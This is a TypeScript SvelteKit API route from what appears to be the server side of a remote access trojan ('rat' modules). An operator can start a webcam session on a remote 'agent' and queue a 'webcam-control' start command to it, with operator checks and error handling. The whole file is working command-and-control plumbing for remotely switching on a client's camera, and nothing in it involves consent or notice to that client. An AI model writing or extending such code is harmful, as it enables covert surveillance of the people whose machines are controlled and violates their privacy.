import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { requireOperator } from '$lib/server/authorization';
import { registry, RegistryError } from '$lib/server/rat/store';
import { webcamControlManager, WebcamControlError } from '$lib/server/rat/webcam';
import type { WebcamCommandPayload, WebcamStreamSettings } from '$lib/types/webcam';

interface CreateSessionPayload {
	deviceId?: string;
	settings?: WebcamStreamSettings;
}

export const POST: RequestHandler = async ({ params, request, locals }) => {
	const clientId = params.clientId;
	if (!clientId) {
		throw error(400, 'Missing agent identifier');
	}

	const operator = requireOperator(locals.user);

	let payload: CreateSessionPayload;
	try {
		payload = (await request.json()) as CreateSessionPayload;
	} catch {
		throw error(400, 'Invalid webcam session payload');
	}

	let session;
	try {
		session = webcamControlManager.createSession(clientId, {
			deviceId: payload.deviceId,
			settings: payload.settings
		});
	} catch (err) {
		if (err instanceof WebcamControlError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to create webcam session');
	}

	const command: WebcamCommandPayload = {
		action: 'start',
		sessionId: session.sessionId,
		deviceId: payload.deviceId,
		settings: payload.settings
	};

	try {
		registry.queueCommand(
			clientId,
			{ name: 'webcam-control', payload: command },
			{ operatorId: operator.id }
		);
	} catch (err) {
		webcamControlManager.deleteSession(clientId, session.sessionId);
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue webcam session command');
	}

	return json(session);
};
